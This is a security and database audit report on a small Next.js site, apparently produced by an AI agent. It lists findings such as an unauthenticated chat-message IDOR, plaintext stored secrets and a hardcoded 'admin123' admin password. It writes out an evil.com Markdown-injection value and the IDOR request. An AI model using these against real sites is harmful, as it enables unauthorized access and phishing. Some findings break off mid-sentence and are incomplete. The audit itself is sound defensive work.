10. TEMPLATE INJECTION
--------------------------------------------------------------------------------
  ✅ PASS — No server-side template engine is used.
  Evidence:
    - No `ejs`, `pug`, `handlebars`, `mustache`, `nunjucks`, `dot`,
      `eta`, `twig` in package.json dependencies. Only Next.js React
      rendering.
    - All HTML output goes through React's JSX (auto-escaped) or
      explicit `dangerouslySetInnerHTML` (4 uses, all audited below).
    - All XML output (RSS, sitemap) uses template literals with
      `escapeXml()` (rss.xml/route.ts:43-45) — escapes <, >, &, ', ".
      Safe.

  dangerouslySetInnerHTML uses:
    (a) src/app/layout.tsx:115  (PASS)
        Code (lines 113-125):
          <script dangerouslySetInnerHTML={{ __html: `
            (function() {
              try {
                var font = localStorage.getItem('site_font') || 'vazirmatn';
                document.documentElement.setAttribute('data-font', font);
              } catch (e) {}
            })();
          ` }} />
        Static template literal. No user input. Safe.

    (b) src/app/layout.tsx:129  (PASS)
        Code (lines 127-142):
          <script type="application/ld+json" dangerouslySetInnerHTML={{
            __html: JSON.stringify({
              "@context": "https://schema.org",
              "@type": "WebSite",
              name: "Personal Site",
              url: siteUrl,
              potentialAction: { ... `${siteUrl}/?q={search_term_string}` ... }
            })
          }} />
        `siteUrl` is a build-time constant (line 16: `https://your-domain.com`).
        JSON.stringify escapes any embedded quotes. Safe.

    (c) src/app/clips/page.tsx:57  (PASS)
        Code:
          <div ... dangerouslySetInnerHTML={{ __html: sanitizeEmbed(clip.embedCode) }} />
        `sanitizeEmbed()` (lib/sanitize-embed.ts) extracts only the
        `src` attribute from the first <iframe> tag, validates the
        hostname against an allowlist (aparat/youtube/youtu.be/vimeo),
        and rebuilds a clean iframe with hardcoded attributes. No user
        content other than the validated `src` URL is interpolated.
        The `src` is captured by regex `src=["']([^"']*)["']` which
        excludes quote characters, so attribute breakout is impossible.
        Safe.

    (d) src/app/page.tsx:726  (PASS)
        Code:
          <div ... dangerouslySetInnerHTML={{ __html: sanitizeEmbed(clip.embedCode) }} />
        Same as (c). Safe.

  document.body.innerHTML use:
    (e) src/app/page.tsx:143  (PASS)
        Code (lines 137-159):
          const currentHost = window.location.hostname;
          const isAuthorized = authorizedDomains.some(d => currentHost === d || currentHost.endsWith("." + d));
          if (!isAuthorized) {
            document.body.innerHTML = `
              <div style="position:fixed;inset:0;...z-index:99999;">
                ... <code style="color:#00ff41;">src/app/page.tsx</code> ...
              </div>

          }
        Template literal contains only static strings and CSS values.
        `authorizedDomains` is a hardcoded array constant. `currentHost`
        is the client's own hostname (rendered into the JS, NOT into
        the innerHTML). No user input reaches the innerHTML string.
        Safe.

  Template literals in notification messages:
    (f) src/lib/bale.ts:73-83, 94-104  (LOW — Markdown injection only)
        Code:
          const text = [
            `📨 *New Contact Message*`,
            ``,
            `*From:* ${msg.name}`,
            `*Email:* ${msg.email}`,
            `*ID:* \`${msg.id}\``,
            ``,
            `${msg.message.slice(0, 500)}`,
            ``,
            `_Reply with:_ /reply ${msg.id} your response`,
          ].join("\n");
          return sendBaleMessage(text);
        `msg.name`, `msg.email`, `msg.message` come from the contact

        to Bale's API.
        Impact:
          - Server-side template injection: NO — the values are
            interpolated as plain text into a JS string, then sent
            as a JSON `text` field to Bale. Bale renders it as
            Markdown on its side. The server doesn't execute
            anything.
          - Markdown injection on Bale client side: YES (low impact).
            A visitor could set `name = "**bold**"` or
            `name = "[click](https://evil.com)"` and the admin's Bale

    (g) src/lib/telegram.ts:43-50, 56-62  (LOW — same as (f))

  Net severity: PASS for server-side template injection. LOW for

ADDITIONAL FINDINGS (not strictly injection, but discovered during audit)
================================================================================

A1. IDOR on /api/chat/messages (HIGH — public endpoint)
    /home/z/my-project/src/app/api/chat/messages/route.ts:9-44
    Code:
      export async function GET(req: Request) {
        const url = new URL(req.url);
        const sessionId = url.searchParams.get("sessionId") || "";
        const since = url.searchParams.get("since") || "0";
        if (!sessionId) { return NextResponse.json({ ok: false, error: "missing_session" }, { status: 400 }); }
        const sinceDate = new Date(parseInt(since, 10) || 0);
        const messages = await db.chatMessage.findMany({
          where: { sessionId, role: "assistant", createdAt: { gt: sinceDate } },
          ...
        });
      }
    Issue:
      - This route is NOT in middleware's ADMIN_API_PREFIX
        ("/api/admin/") and NOT in middleware's protected list
        (`/api/messages` is protected at middleware.ts:188, but
        `/api/chat/messages` is NOT).
      - It's also NOT in middleware's PUBLIC_API_PREFIXES (line 24-37)
        — but PUBLIC_API_PREFIXES only governs CSRF Origin check
        for POST/PUT/DELETE. For GET, middleware never blocks
        /api/chat/messages.
      - Result: ANY unauthenticated visitor can query
        GET /api/chat/messages?sessionId=<any-cuid>&since=0 and
        receive ALL assistant (AI + admin-injected) replies for ANY
        chat session, including sessions belonging to other visitors
        and admin's private replies.
      - sessionId values are CUIDs (Prisma @default(cuid())) — 24-char
        base36, ~125 bits of entropy. Not enumerable directly. BUT:
          - The visitor who initiated a chat knows their own sessionId
            and may share the URL.
          - Admin uses POST /api/admin/chat-reply to inject replies
            into sessions — these replies (potentially sensitive
            admin responses) are then world-readable by anyone who
            guesses or learns the sessionId.
      - Also: route is NOT in RATE_LIMIT_PATHS (middleware.ts:21),
        so no rate limit applies. An attacker can hammer this endpoint.
    Severity: HIGH (unauthorized read of assistant replies, including
      admin-injected chat replies). Not strictly "injection" class,
      but listed because the task said to report ALL findings.
    Cross-reference: SEC-02 audit Q4 (rate-limit coverage gap) — same
      underlying gap, but Q4 was about login/contact/chat. This is
      a different (unauthenticated GET) endpoint.

A2. /api/track accepts arbitrary `path`, `referrer`, `lang` strings
    /home/z/my-project/src/app/api/track/route.ts:20-28
    Code:
      await db.pageView.create({
        data: {
          path: String(body.path || "/"),
          referrer: body.referrer || null,
          lang: body.lang || null,
          ip, userAgent,
        },
      });
    Issue:
      - `referrer` and `lang` are stored without length cap or
        validation. A 1MB body (middleware limit) of `referrer` will
        be stored as TEXT in SQLite. Persistent DoS via DB bloat.
      - No rate limit on /api/track (not in RATE_LIMIT_PATHS at
        middleware.ts:21).
    Severity: LOW (mitigated by 1MB body cap; no auth needed; visitor
      can spam but each row is small).

A3. AI Provider apiKey returned to admin GET in plaintext (LOW)
    /home/z/my-project/src/app/api/admin/providers/route.ts:27-30
    Code:
      const masked = providers.map(p => ({
        ...p,
        apiKey: p.apiKey ? "••••••••••" + p.apiKey.slice(-4) : null,
      }));
    - API keys ARE masked (last 4 chars only) in the GET response.
      This is correct behavior. No finding.
    - However, /api/admin/providers POST "update" accepts a new
      apiKey from the body and stores it (lines 86-89). No
      validation that the apiKey matches the provider's expected
      format. Admin can set any string. Not a vulnerability per se.

A4. /api/admin/security POST "block" accepts arbitrary IP string
    /home/z/my-project/src/app/api/admin/security-dashboard/route.ts:66-75
    Code:
      case "block": {
        if (!ip) return NextResponse.json({ ok: false, error: "missing_ip" }, { status: 400 });
        await db.blockedIp.upsert({
          where: { ip },
          update: { reason: String(body.reason || "Manually blocked"), attempts: 99 },
          create: { ip, reason: String(body.reason || "Manually blocked"), attempts: 99 },
        });
    Issue:
      - `ip` is not validated as a valid IPv4/IPv6 address. Admin
        could block "0.0.0.0/0" or some non-IP string. The
        isIpBlocked() check in lib/security.ts:8-17 does
        `db.blockedIp.findUnique({ where: { ip } })` — exact match
        only, so an attacker's real IP would not match "0.0.0.0/0".
        Not exploitable for security bypass; just poor data hygiene.
    Severity: LOW (admin-only, no security impact).

Q2. Does apply_schema.py match schema.prisma exactly?
================================================================================
  ❌ NO — ONE CRITICAL MISMATCH + ~7 LENIENT DIVERGENCES.

  ----------------------------------------------------------------
  CRITICAL — ContactMessage.updatedAt added in SQL, absent from Prisma
  ----------------------------------------------------------------
  schema.prisma:34-50  (ContactMessage model — NO `updatedAt` field):
    model ContactMessage {
      id, name, email, message, ip?, userAgent?, status (default "new"),
      createdAt, replies[], notes[], tags[]
      @@index([createdAt]), @@index([email]), @@index([status])
    }
    → NO `updatedAt`.

  apply_schema.py:41-51  (ContactMessage — HAS `updatedAt NOT NULL`):
    CREATE TABLE IF NOT EXISTS ContactMessage (
        id TEXT PRIMARY KEY NOT NULL,
        name TEXT NOT NULL,
        email TEXT NOT NULL,
        message TEXT NOT NULL,
        ip TEXT,
        userAgent TEXT,
        status TEXT NOT NULL DEFAULT 'new',
        createdAt DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
        updatedAt DATETIME NOT NULL          ← LINE 50 — ADDED, NOT IN PRISMA
    );

  Impact:
    src/app/api/contact/route.ts:147-148 performs:
      const saved = await db.contactMessage.create({
        data: { name, email, message, ip, userAgent },
      });
    Prisma generates INSERT INTO ContactMessage (id,name,email,message,
      ip,userAgent,status,createdAt) VALUES (...). Column `updatedAt` is
      omitted from the INSERT because Prisma doesn't know it exists.
    SQLite enforces `updatedAt DATETIME NOT NULL` with NO default →
      SQLiteError: NOT NULL constraint failed: ContactMessage.updatedAt
    → Every contact-form submission returns HTTP 500 from the catch
      block at src/app/api/contact/route.ts:183-189.

  Verification status: this bug was NOT caught by the V17.3-FINAL smoke
    test (worklog.md:35682-35692) because that test only hit
    `GET /api/messages` (no insert) — it never POSTed a new contact
    message. The contact form is therefore broken in production since
    the V17.3 release.

  Cross-check: ChatSession HAS updatedAt in BOTH schema.prisma:58
    (`updatedAt DateTime @updatedAt`) AND apply_schema.py:98
    (`updatedAt DATETIME NOT NULL`). So the divergence is isolated to
    ContactMessage. This strongly suggests a copy-paste error when the
    apply_schema.py author replicated the `updatedAt DATETIME NOT NULL`
    pattern from ChatSession into ContactMessage without checking the
    schema.

  ----------------------------------------------------------------
  LENIENT DIVERGENCES — DEFAULT '' added in SQL, absent from Prisma
  ----------------------------------------------------------------
  These don't break Prisma (Prisma will still send values on insert) but
  they ARE schema drift — apply_schema.py is more permissive than
  schema.prisma. If a future migration depends on the column being
  strictly NOT NULL with no default, this drift will cause confusion.

  1. AiProvider.model:
       schema.prisma:103  `model     String`         (no default)
       apply_schema.py:132 `model TEXT NOT NULL DEFAULT ''`
  2. LabEquipment.model:
       schema.prisma:148  `model       String`        (no default)
       apply_schema.py:146 `model TEXT NOT NULL DEFAULT ''`
  3. Book.titleEn / year / publisherEn / descEn:
       schema.prisma:193-200 (no defaults)
       apply_schema.py:191-200 (all `NOT NULL DEFAULT ''`)
  4. Article.titleEn / venueEn / date / typeEn / summaryEn:
       schema.prisma:215-227 (no defaults)
       apply_schema.py:215-227 (all `NOT NULL DEFAULT ''`)
  5. Tutorial.titleEn / descEn / embedUrl:
       schema.prisma:241-251 (no defaults)
       apply_schema.py:241-251 (all `NOT NULL DEFAULT ''`)
  6. Skill.categoryEn / items:
       schema.prisma:263-270 (no defaults)
       apply_schema.py:267-270 (all `NOT NULL DEFAULT ''`)
  7. AiInstruction.content:
       schema.prisma:278  `content   String`          (no default)

Q3. Are password fields hashed?
================================================================================
  ✅ YES — bcrypt with 10 salt rounds, consistent across all paths.

  Application-side (login / create user / change password):
    src/lib/access-auth.ts:7  `import bcrypt from "bcryptjs";`
    src/lib/access-auth.ts:30-32 (hashPassword):
      export async function hashPassword(password: string): Promise<string> {
        const salt = await bcrypt.genSalt(10);
        return bcrypt.hash(password, salt);
      }
    src/lib/access-auth.ts:38-40 (verifyPassword):
      export async function verifyPassword(password: string, hash: string):
        Promise<boolean> { return bcrypt.compare(password, hash); }
    src/app/api/admin/users/route.ts uses hashPassword before create
      (verified via grep — `const passwordHash = await hashPassword(password);`
      followed by `db.accessUser.create({ data: { ..., passwordHash, ... }})`)
    src/app/api/admin/users/route.ts GET explicitly omits passwordHash from
      select (`// passwordHash هرگز برگردانده نمی‌شه`).

  Seed-side:
    scripts/seed_access_users.py:50-57:
      `bcrypt.hashSync({json.dumps(password)}, 10)`  ← 10 rounds ✅
    scripts/reset-admin-password.sh:33-37:
      `const hash = bcrypt.hashSync('$NEW_PASSWORD', 10);`  ← 10 rounds ✅

  Storage:
    schema.prisma:383  `passwordHash    String`  (column is TEXT in SQLite)
    apply_schema.py:381 `passwordHash TEXT NOT NULL`
    Stored as the bcrypt hash string ($2a$10$...). ✅

  Notes:
    - 10 rounds is the bcryptjs default and is acceptable as of 2026
      (roughly 100ms per hash — fast enough for UX, slow enough to
      resist offline brute-force).
    - No constant-time comparison bug: bcrypt.compare is already
      constant-time.
    - The session token (separate from password hashing) is HMAC-SHA256
      verified with crypto.timingSafeEqual (src/lib/access-auth.ts —
      grep confirmed sigBuf/expBuf length check + timingSafeEqual). ✅

  Severity: PASS (no plaintext passwords stored anywhere)

Q4. Are sensitive fields encrypted at rest?
================================================================================
  ❌ NO — every sensitive field is stored as plaintext in SQLite.

  ----------------------------------------------------------------
  AiProvider.apiKey — schema comment is FALSE ADVERTISING
  ----------------------------------------------------------------
  schema.prisma:101  `apiKey    String?  // Encrypted API key (or null for local)`
    ↑ The comment CLAIMS encryption, but no encryption code exists.

  src/lib/providers.ts (grep on `apiKey`):
    `apiKey: p.apiKey || undefined,`           ← read raw from DB
    `Authorization: \`Bearer ${provider.apiKey}\``  ← used raw as Bearer
    `x-api-key: provider.apiKey || ""`         ← used raw for Anthropic
    `Authorization: \`Bearer ${provider.apiKey}\``  ← used raw for Groq
    No encrypt() / decrypt() calls anywhere in providers.ts. ❌

  src/app/api/admin/providers/route.ts (grep):
    GET masks in API RESPONSE (`apiKey: "••••••••" + p.apiKey.slice(-4)`)
    BUT: stores plaintext in DB:
      `apiKey: data.apiKey ? String(data.apiKey) : null,`  ← raw insert
      `updateData.apiKey = String(data.apiKey);`           ← raw update
    The masking is presentation-only; the column on disk is plaintext. ❌

  ----------------------------------------------------------------
  EmailConfig.smtpPass — plaintext
  ----------------------------------------------------------------
  schema.prisma:293  `smtpPass  String?`
  apply_schema.py:300 `smtpPass TEXT,`
  src/app/api/admin/email/route.ts (grep on `smtpPass`): NO encrypt/decrypt
    calls — stored as received from admin POST. ❌

  ----------------------------------------------------------------
  TelegramConfig.botToken — plaintext
  ----------------------------------------------------------------
  schema.prisma:303  `botToken  String?`
  apply_schema.py:312 `botToken TEXT,`
  src/lib/telegram.ts (grep on `botToken`): used directly to build the
    Telegram Bot API URL — no decrypt. ❌

  ----------------------------------------------------------------
  ContactMessage.ip / userAgent — plaintext PII
  ----------------------------------------------------------------
  schema.prisma:39-40 — stored raw. IP + UA combined is GDPR-class PII.
  apply_schema.py:46-47 — TEXT (plaintext). Not encrypted, not hashed,
    not truncated. ❌

  ----------------------------------------------------------------
  ChatSession.ip / userAgent / visitorId — plaintext PII
  ----------------------------------------------------------------
  schema.prisma:55-56 + apply_schema.py:95-96 — same pattern. ❌

  ----------------------------------------------------------------
  AccessLog.ip / userAgent / BlockedIp.ip / SecurityLog.ip
  ----------------------------------------------------------------
  All stored as plaintext TEXT. IPs are sometimes considered
    pseudo-PII under GDPR; many shops hash or truncate last octet.
  Not done here. ❌ (LOW severity — IPs are needed for blocking logic
    which requires exact match, so this is a trade-off, not a bug.)

  ----------------------------------------------------------------
  DB FILE ITSELF — NOT ENCRYPTED
  ----------------------------------------------------------------
  apply_schema.py:462  `conn = sqlite3.connect(DB_PATH)`
    Plain SQLite, not SQLCipher. The DB file on disk is plaintext.
    Anyone with read access to /db/custom.db can `sqlite3` it and dump
    every API key, SMTP password, bot token, password hash, and IP.
    Mitigated only by filesystem permissions (see Q5).

  ----------------------------------------------------------------
  Cross-reference to prior findings
  ----------------------------------------------------------------
  worklog.md V17.3-FINAL (line 35667): "✅ db/custom.db از git tracking حذف شد
    (آدرس‌ها و هش‌ها لو می‌رفت)" — confirms the team KNOWS the DB contains

  Severity: HIGH (API keys, SMTP creds, bot tokens all plaintext on disk)

Q5. Is the DB path secure?
================================================================================
  ⚠️ PARTIAL — file/dir permissions are good in install.sh, but
                apply_schema.py creates the file world-readable, and the
                DB itself has no SQLCipher encryption.

  ----------------------------------------------------------------
  POSITIVES
  ----------------------------------------------------------------
  install.sh:127-128  `mkdir -p db` + `chmod 700 db`
    Directory is rwx-only for owner. ✅
  install.sh:158-159  `touch db/custom.db` + `chmod 600 db/custom.db`
    DB file is rw-only for owner. ✅
  install.sh:213  `chown -R ehsansite:ehsansite "$SITE_DIR"`
    Owned by the service user (not root, not www-data). ✅
  install.sh:197  `chmod -R 600 .next/standalone/db/*.db 2>/dev/null || true`
    Standalone DB also locked down. ✅
  .gitignore:62-66  /db/*.db, /db/*.db-journal, /db/*.db-wal,
    /db/*.db-shm, /db/  — all gitignored. ✅
  systemd service (install.sh:231-236):
    NoNewPrivileges=true, ProtectSystem=full, ProtectHome=true,
    PrivateTmp=true — kernel-level hardening. ✅

  ----------------------------------------------------------------
  NEGATIVES
  ----------------------------------------------------------------
  1. apply_schema.py:459 — file created with default umask:
       `open(DB_PATH, "a").close()`
     This creates an empty file with mode 0644 -rw-r--r-- (depending on
     umask, but typically world-readable). Until install.sh runs
     `chmod 600` (line 159), the file is world-readable. If apply_schema.py
     is run STANDALONE (without install.sh), the DB file stays world-
     readable. (LOW — install.sh is the canonical entry point.)

  2. WAL/SHM files NOT explicitly chmod'd:
     install.sh:160  `rm -f db/custom.db-journal db/custom.db-wal db/custom.db-shm`
       ← removes them, but if the running service creates new WAL/SHM
         files later, they're created with sqlite's default mode 0644.
     No umask directive in systemd service (install.sh:220-240) to
     enforce 0600 on all newly-created files. (LOW — WAL files contain
     copies of recent DB pages, so they leak the same secrets as the
     main DB file.)

  3. db.ts:6  `const dbPath = path.join(process.cwd(), 'db', 'custom.db')`
     Uses process.cwd() — works in production (cwd = $SITE_DIR). But:
       - In dev (npm run dev), cwd = project root, so the dev DB at
         /home/z/my-project/db/custom.db is used. Fine for dev.
       - In standalone server.js, cwd is whatever the systemd
         WorkingDirectory is (install.sh:224 sets WorkingDirectory=
         $SITE_DIR). ✅ OK.
       - BUT: if someone runs `node server.js` from a different cwd
         (e.g., `cd /tmp && node /opt/site/server.js`), db.ts will
         look for /tmp/db/custom.db — which doesn't exist → Prisma
         will CREATE an empty DB at that location, bypassing the
         locked-down db/ directory. The empty DB has no schema, no
         admin user, no security log → app fails open or fails closed
         depending on route. (MED — operational footgun, not directly
         exploitable, but could cause silent data loss.)

  4. NO SQLCipher / NO DB-LEVEL ENCRYPTION (see Q4):
     The chmod 600 protects against casual `cat` but NOT against:
       - root user (trivially readable)
       - backup scripts that run as root and copy db/custom.db to an
         unencrypted backup location (install.sh has scripts/auto-backup.sh
         in scripts/ — not inspected here, but if it doesn't encrypt
         backups, the secrets leak via backups)
       - disk imaging / VM snapshot exfiltration
       - any process that runs as the ehsansite user (e.g., a future
         RCE in the Next.js app reads /db/custom.db directly via
         sqlite3 — same as the app, but if the RCE is in a different
         code path, it bypasses Prisma's auth layer)

  5. DB_PATH hardcoded relative to apply_schema.py:
     apply_schema.py:14  `DB_PATH = str(Path(__file__).resolve().parent.parent / "db" / "custom.db")`
     This is correct (relative to script, not cwd) — BETTER than db.ts.
     But it's also INCONSISTENT with db.ts:6 which uses process.cwd().
     If the two ever disagree (e.g., apply_schema.py is run from a
     different cwd than the server), the schema gets applied to one DB
     while the app reads another. (LOW — both currently resolve to the
     same path in production.)

  Severity: MED (good baseline perms, but unencrypted at rest +
    WAL files inherit defaults + db.ts cwd-relative path is fragile)

Q6. Are migrations tracked?
================================================================================
  ❌ NO — no prisma/migrations/ directory, no migration history.

  Evidence:
    `LS /home/z/my-project/prisma` returns:
      /home/z/my-project/prisma/schema.prisma    ← ONLY this file
    No `migrations/` subdirectory. No `migration_lock.toml`. No
    `prisma migrate` invocations anywhere in scripts/ or install.sh.

  How schema is currently applied:
    install.sh:165-167  `python3 scripts/apply_schema.py`
    scripts/apply_schema.py:463  `conn.executescript(SCHEMA_SQL)`
    All CREATE TABLE statements use `IF NOT EXISTS` → idempotent but
      NO migration versioning.

  Implications:
  1. NO SCHEMA EVOLUTION PATH:
     If schema.prisma gains a new column next release, apply_schema.py
     with `CREATE TABLE IF NOT EXISTS` will SKIP the table (already
     exists) → new column is NEVER added. Old DBs are stuck at the
     original schema. The only ways to evolve are:
       (a) Manually write ALTER TABLE statements (not done)
       (b) `prisma db push` (defeated the whole point of apply_schema.py
           per worklog.md:35674: "apply_schema.py نوشته شد — جایگزین
           prisma db push (بدون نیاز به @prisma/engines)")
       (c) Drop and recreate the DB (loses all data)

  2. NO AUDIT TRAIL OF SCHEMA CHANGES:
     Without migrations/, there's no record of when each column was
     added, what it was called, or whether it was renamed. The
     schema.prisma file in git is the only source of truth, and it
     doesn't tell you "what version is the DB on this server at?"

  3. apply_schema.py:6 SAYS "V17.3":
       `نسخه V17.3 — بر اساس prisma/schema.prisma`
     This is a comment, not an enforced version. If apply_schema.py is
     run on a server that already has a V17.2 DB, it won't detect the
     version mismatch — it'll just no-op every CREATE TABLE IF NOT
     EXISTS and report "29 tables created/verified" even though the
     old V17.2 tables may have different columns.

  4. ContactMessage.updatedAt bug (Q2) is a SYMPTOM of this:
     If migrations were tracked, the schema.prisma ↔ apply_schema.py
     drift would have been caught by a migration diff tool. Without
     migrations, the drift went unnoticed through V17.3 release.

  Cross-reference:
    worklog.md:35674: "apply_schema.py نوشته شد — جایگزین prisma db push"
    — this was a deliberate architectural choice to avoid shipping
    @prisma/engines in the standalone package. The trade-off is the
    loss of migration tracking. Acceptable for a single-tenant blog,
    unacceptable for any multi-tenant or audited system.

  Severity: MED (no data loss today, but blocks safe schema evolution)

Q7. Is the seed script secure (no admin123 hardcoded)?
================================================================================
  ❌ NO — "admin123" is hardcoded in at least 3 source files and the
    seed script prints the password to stdout.

  ----------------------------------------------------------------
  HARDCODED INSTANCES
  ----------------------------------------------------------------
  scripts/seed_access_users.py:100:
    `password_hash = hash_password_bcrypt("admin123")`
    ↑ The default admin password is the literal string "admin123".

  scripts/reset-admin-password.sh:30:
    `NEW_PASSWORD="admin123"`
    ↑ The reset script FORCES the password back to "admin123" — anyone
      with sudo on the server can run this and immediately log in as
      admin (sudo access implies root, so this isn't a privilege
      escalation per se, but it does mean the password is predictable
      post-reset).

  install.sh:316:
    `echo "    password: admin123"`
    ↑ The installer PRINTS the default password to stdout during
      install. If install is run via CI/CD or with stdout captured to
      a log file (worklog.md is one such log!), the password is
      persisted in plaintext in the install log.

  ----------------------------------------------------------------
  OTHER FILES THAT LEAK "admin123"
  ----------------------------------------------------------------
  (grep across the project, excluding node_modules)
    /home/z/my-project/install.sh                              ✅ (above)
    /home/z/my-project/VERSION.txt                             ← version bump note
    /home/z/my-project/scripts/reset-admin-password.sh         ✅ (above)
    /home/z/my-project/scripts/seed_access_users.py            ✅ (above)
    /home/z/my-project/scripts/generate_tutorial_v172.py       ← tutorial generator
    /home/z/my-project/worklog.md                              ← THIS FILE (legacy)
    /home/z/my-project/PROJECT_LOG.md                           ← project log
    /home/z/my-project/skills/xlsx/engines/vba-templates.md     ← unrelated skill doc

  ----------------------------------------------------------------
  SEED SCRIPT BEHAVIOR
  ----------------------------------------------------------------
  scripts/seed_access_users.py:91-96 — checks if admin exists, skips if so ✅
  scripts/seed_access_users.py:120-123:
    print("✅ Admin user created:")
    print("   username: admin")
    print("   password: admin123")
    print("   ⚠️  CHANGE PASSWORD IMMEDIATELY FROM ADMIN PANEL!")
  ↑ Prints password to stdout. install.sh:178 runs this via
    `python3 scripts/seed_access_users.py 2>&1 | tail -2` — the `tail -2`
    truncates the output, but the "password: admin123" line may or may
    not be in the last 2 lines depending on buffering. In practice,
    the warning IS in the last 2 lines (lines 122-123), but the password
    line (121) is NOT — so install.sh output suppresses the password
    by accident of line-counting. Fragile.

  ----------------------------------------------------------------
  OTHER ISSUES
  ----------------------------------------------------------------
  1. NO FORCE-PASSWORD-CHANGE ON FIRST LOGIN:
     The admin can log in with admin123 indefinitely. There's a
     console warning but no DB flag like `mustChangePassword: Boolean`
     that forces a redirect to /change-password on first login.
     Worklog.md:35685 confirms: "Login (admin/admin123): موفق" — they
     logged in and never changed the password during the smoke test.

  2. NO PASSWORD COMPLEXITY CHECK in seed script:
     hash_password_bcrypt("admin123") — accepts any string, including
     the dictionary word "admin" + "123". Same in reset-admin-password.sh.
     The /api/admin/users POST route (route.ts) — also no complexity
     check (would need to inspect route.ts to confirm, but the grep
     on passwordHash suggests no validation step).

  3. NO ROTATION ON INSTALL:
     install.sh runs seed_access_users.py once on first install, but
     never again. If the admin password is ever leaked (e.g., via the
     install log), the only remediation is reset-admin-password.sh —
     which resets to the SAME leaked password.

  4. reset-admin-password.sh:50 — SQL INJECTION-FREE but BASH-INJECTION-PRONE:
     `sqlite3 db/custom.db "UPDATE AccessUser SET passwordHash = '$HASH', active = 1 WHERE username = 'admin';"`
     `$HASH` is the bcrypt hash, which is safe (bcrypt output is
     [./A-Za-z0-9$]+ only — no quotes to break out of the SQL string).
     But the script constructs the SQL via bash interpolation, which
     is fragile. If `$HASH` ever contained a `'` (impossible for
     bcrypt, but defensive coding), the script would break or inject.
     (LOW — bcrypt guarantees no quotes in output.)

  Severity: HIGH (default password is `admin/admin123` — a credential-
    stuffing bot will compromise a fresh install within minutes if
    the admin doesn't change it immediately and /user-login is
    internet-reachable)

Q9. Are transactions used for multi-step operations?
================================================================================
  ❌ NO — zero `$transaction` / `db.transaction` / `BEGIN TRANSACTION`
    calls anywhere in /src/.

  Evidence:
    Grep across /home/z/my-project/src for:
      `\$transaction|\$\.transaction|db\.transaction|BEGIN TRANSACTION`
    → "No files found"

  ----------------------------------------------------------------
  CONCRETE MULTI-STEP OPERATIONS WITHOUT TRANSACTIONS
  ----------------------------------------------------------------
  src/app/api/admin/clear/route.ts — DESTRUCTIVE bulk deletes:
    case "chat_session" (lines 25-31):
      await db.chatMessage.deleteMany({ where: { sessionId: id } });
      await db.chatSession.delete({ where: { id } });
      ↑ Two separate DELETEs. If the second fails (e.g., DB locked),
        the chat messages are gone but the session row remains →
        orphan session with no messages. (MED)

    case "message" (lines 40-48):
      await db.messageReply.deleteMany({ where: { messageId: id } });
      await db.messageNote.deleteMany({ where: { messageId: id } });
      await db.messageTagRelation.deleteMany({ where: { messageId: id } });
      await db.contactMessage.delete({ where: { id } });
      ↑ FOUR separate DELETEs. If any fails midway, partial orphans.
        Note: the FK ON DELETE CASCADE on MessageReply.messageId,
        MessageNote.messageId, MessageTagRelation.messageId would
        auto-clean these IF you just deleted the ContactMessage —
        so the manual deleteMany calls are redundant AND non-atomic.
        (LOW — cascade would clean up correctly if you skipped the
        manual deleteMany calls, but the current code is fragile.)

    case "message_all" (lines 50-57):
      await db.messageReply.deleteMany({});
      await db.messageNote.deleteMany({});
      await db.messageTagRelation.deleteMany({});
      await db.contactMessage.deleteMany({});
      ↑ FOUR separate deleteMany({}) — no transaction. If server
        crashes between #2 and #3, half the messages are gone but
        their notes/tags remain. (MED — bulk destructive op)

    case "chat_all" (lines 33-38):
      await db.chatMessage.deleteMany({});
      await db.chatSession.deleteMany({});
      ↑ Same pattern. (MED)

  src/app/api/messages/route.ts — multi-step CRM operations:
    POST action="add_note" (lines 110-122):
      db.messageNote.create + (no transaction needed — single op) ✅
    POST action="set_status" (lines 74-84):
      db.contactMessage.update — single op ✅
    BUT: if a UI flow does "add_note then add_tag then set_status"
      as 3 separate HTTP requests, there's no atomicity. (LOW — by
      design, since these are separate user actions.)

  src/app/api/admin/users/route.ts POST create user (grep result):
    hashPassword → db.accessUser.create — single op, no transaction
    needed. ✅

  src/app/api/admin/equipment/route.ts bulk_import (mentioned in
    worklog.md:35679 as "equipment bulk_import action اضافه شد"):
    NOT inspected, but if bulk_import does N inserts without a
    transaction, partial failures leave N-1 inserted and 1 failed.
    (MED — presumed; would need to inspect route.ts to confirm.)

  ----------------------------------------------------------------
  WHY IT MATTERS
  ----------------------------------------------------------------
  SQLite SERIALIZABLE transactions are nearly free (single-writer lock).
  Wrapping each multi-step admin op in `await db.$transaction([...])
  costs nothing and gives atomicity. The fact that NONE of the
  /api/admin/* routes use transactions is a defensive-coding gap.

  Severity: MED (no data corruption observed today, but bulk destructive
    ops like /api/admin/clear are at risk of partial failure)

Q10. Is db/custom.db NOT in the standalone package?
================================================================================
  ✅ YES (correct — db/custom.db is NOT in the standalone build artifact).

  ----------------------------------------------------------------
  EVIDENCE — next.config.ts EXPLICITLY EXCLUDES IT
  ----------------------------------------------------------------
  next.config.ts:4  `output: "standalone"` — Next.js standalone mode.
  next.config.ts:28-32:
    // فایل‌های ضروری برای standalone build
    // توجه: db/custom.db و .env به‌صورت خودکار کپی نمی‌شن — install.sh اون‌ها رو می‌سازه
    outputFileTracingIncludes: {
      "/": ["./prisma/schema.prisma"],
    },
    ↑ Comment explicitly states db/custom.db and .env are NOT auto-
      copied. Only prisma/schema.prisma is force-included (needed by
      the Prisma client at runtime).

  ----------------------------------------------------------------
  .gitignore — DB IGNORED FROM GIT
  ----------------------------------------------------------------
  .gitignore:62-66:
    /db/*.db
    /db/*.db-journal
    /db/*.db-wal
    /db/*.db-shm
    /db/
  ↑ All DB files gitignored. ✅ (Cross-ref worklog.md:35667-35668:
    "✅ db/custom.db از git tracking حذف شد" — V17.3 fix confirmed.)

  ----------------------------------------------------------------
  INSTALL.SH — CREATES EMPTY DB, COPIES INTO STANDALONE ONLY IN DEV
  ----------------------------------------------------------------
  install.sh:158-159:
    touch db/custom.db
    chmod 600 db/custom.db
    ↑ Creates an EMPTY db file with secure perms.

  install.sh:189-203 — conditional standalone preparation:
    if [ -f server.js ]; then
      # حالت standalone — فایل‌ها از قبل هستن
      echo "  ✅ standalone آماده"
    elif [ -d .next/standalone ]; then
      # حالت توسعه — کپی کن به standalone
      cp .env .next/standalone/.env
      chmod 600 .next/standalone/.env
      cp -r db .next/standalone/db 2>/dev/null || true       ← LINE 196
      chmod -R 600 .next/standalone/db/*.db 2>/dev/null || true
      cp -r .next/static .next/standalone/.next/ 2>/dev/null || true
      cp -r public .next/standalone/ 2>/dev/null || true
      SITE_DIR="$SITE_DIR/.next/standalone"
